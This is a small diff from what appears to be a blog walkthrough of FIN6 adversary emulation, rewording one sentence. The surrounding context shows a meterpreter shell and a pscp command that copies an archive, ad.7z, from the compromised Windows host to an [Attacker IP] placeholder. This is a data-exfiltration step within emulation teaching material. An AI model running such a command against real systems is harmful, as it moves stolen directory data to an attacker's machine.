@@ -480,7 +480,7 @@ meterpreter > shell
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-4_2_Open_CMD_Shell.png){:width="100%"}
 
-We can now transfer the file `ad.7z` back to our Attacker VM using the following command:
+We can now transfer the file `ad.7z` back to our Attacker VM using this command:
 
 ```ps
 C:\Users\Administrator\Downloads>.\pscp.exe -P 22 .\ad.7z [username]@[Attacker IP]:[Target Directory]
